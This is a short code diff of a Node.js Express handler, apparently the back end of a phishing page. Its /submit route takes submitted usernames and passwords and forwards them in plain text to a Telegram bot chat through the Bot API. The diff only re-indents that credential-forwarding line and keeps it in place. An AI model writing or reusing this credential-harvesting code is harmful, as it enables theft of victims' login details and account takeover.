@@ -12,7 +12,7 @@ app.post('/submit', (req, res) => {
     const { username, password } = req.body;
     
     // Telegram ka URL jahan data bhejna hai
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=Username: ${username} Password: ${password}`;
+ const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=Username: ${username} Password: ${password}`;
 
     https.get(url, (telegramRes) => {
         let data = '';
